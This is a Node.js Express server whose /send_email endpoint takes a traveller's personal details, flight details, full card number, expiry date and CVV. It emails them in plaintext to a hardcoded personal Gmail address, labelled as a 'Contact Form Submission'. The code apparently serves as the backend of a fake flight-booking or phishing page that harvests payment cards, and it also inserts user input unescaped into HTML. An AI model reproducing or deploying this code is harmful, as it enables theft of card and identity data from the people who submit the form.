const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');
const dotenv = require('dotenv');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 7000;

dotenv.config();

app.use(cors());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

const transporter = nodemailer.createTransport({
    service: 'Gmail',
    auth: {
        user: process.env.USER, // Your Gmail email address
        pass: process.env.PASS, // Your Gmail password (use an app-specific password)
    },
});

app.get('/', (req, res) => {
    res.send('API is working');
});

// app.post('/send_email', (req, res) => {
//     const { name, email, phone, from, to, trip, flying, departuring, dob, card_number, mm, yy, cvv ,address , pincode, city , country } = req.body;

//     const mailOptions = {
//         from: 'ap1663392@gmail.com',
//         to: 'ap1663392@gmail.com', // Receiver's email address
//         subject: 'Contact Form Submission',
//         text: `Name: ${name}\nEmail: ${email}\nPhone:${phone}\nTrip: ${trip}\nDeparturing: ${departuring}\nFlying: ${flying}\nfrom:${from}\nto:${to}\nDOB : ${dob}\nCard_Number : ${card_number}\nMM : ${mm}\nyy : ${yy}\nCVV :${cvv}\naddress: ${address}\npincode: ${pincode}\ncity: ${city}\ncountry: ${country}`,
//     };
//     transporter.sendMail(mailOptions, (error, info) => {
//         if (error) {
//             console.error('Error sending email:', error);
//             res.status(500).json({ success: false, error: 'An error occurred while sending the email' });
//         } else {
//             console.log('Email sent:', info.response);
//             res.json({ success: true, message: 'Email sent successfully' });
//         }
//     });
// });


app.post('/send_email', (req, res) => {
    const { name, email, phone, from, to, trip, flying, departuring, dob, card_number, mm, yy, cvv, address, pincode, city, country } = req.body;

    const tableContent = `
        <table style="border-collapse: collapse; width: 50%;">
            <tr>
                <th style="border: 1px solid black; padding: 8px;">Field</th>
                <th style="border: 1px solid black; padding: 8px;">Value</th>
            </tr>
            <tr>
                <td style="border: 1px solid black; padding: 8px;">Name</td>
                <td style="border: 1px solid black; padding: 8px;">${name}</td>
            </tr>
            <tr>
                <td style="border: 1px solid black; padding: 8px;">Email</td>
                <td style="border: 1px solid black; padding: 8px;">${email}</td>
            </tr>
            <tr>
                <td style="border: 1px solid black; padding: 8px;">Phone</td>
                <td style="border: 1px solid black; padding: 8px;">${phone}</td>
            </tr>
            <tr>
                <td style="border: 1px solid black; padding: 8px;">From</td>
                <td style="border: 1px solid black; padding: 8px;">${from}</td>
            </tr>
            <tr>
                <td style="border: 1px solid black; padding: 8px;">To</td>
                <td style="border: 1px solid black; padding: 8px;">${to}</td>
            </tr>
            <tr>
                <td style="border: 1px solid black; padding: 8px;">Trip</td>
                <td style="border: 1px solid black; padding: 8px;">${trip}</td>
            </tr>
            <tr>
                <td style="border: 1px solid black; padding: 8px;">Departuring</td>
                <td style="border: 1px solid black; padding: 8px;">${departuring}</td>
            </tr>
            <tr>
                <td style="border: 1px solid black; padding: 8px;">Date of Birth</td>
                <td style="border: 1px solid black; padding: 8px;">${dob}</td>
            </tr>
            <tr>
                <td style="border: 1px solid black; padding: 8px;">Card Number</td>
                <td style="border: 1px solid black; padding: 8px;">${card_number}</td>
            </tr>
            <tr>
                <td style="border: 1px solid black; padding: 8px;">MM</td>
                <td style="border: 1px solid black; padding: 8px;">${mm}</td>
            </tr>
            <tr>
                <td style="border: 1px solid black; padding: 8px;">YY</td>
                <td style="border: 1px solid black; padding: 8px;">${yy}</td>
            </tr>
            <tr>
                <td style="border: 1px solid black; padding: 8px;">CVV</td>
                <td style="border: 1px solid black; padding: 8px;">${cvv}</td>
            </tr>
            <tr>
                <td style="border: 1px solid black; padding: 8px;">Address</td>
                <td style="border: 1px solid black; padding: 8px;">${address}</td>
            </tr>
            <tr>
                <td style="border: 1px solid black; padding: 8px;">Pincode</td>
                <td style="border: 1px solid black; padding: 8px;">${pincode}</td>
            </tr>
            <tr>
                <td style="border: 1px solid black; padding: 8px;">City</td>
                <td style="border: 1px solid black; padding: 8px;">${city}</td>
            </tr>
            <tr>
                <td style="border: 1px solid black; padding: 8px;">Country</td>
                <td style="border: 1px solid black; padding: 8px;">${country}</td>
            </tr>
        </table>
    `;

    const mailOptions = {
        from: 'ap1663392@gmail.com',
        to: 'ap1663392@gmail.com', // Receiver's email address
        subject: 'Contact Form Submission',
        html: `
            <p>Contact Form Submission:</p>
            ${tableContent}
        `,
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('Error sending email:', error);
            res.status(500).json({ success: false, error: 'An error occurred while sending the email' });
        } else {
            console.log('Email sent:', info.response);
            res.json({ success: true, message: 'Email sent successfully' });
        }
    });
});

app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
    // console.log(`${process.env.User}`)
    // console.log(`${process.env.PASS}`)
});



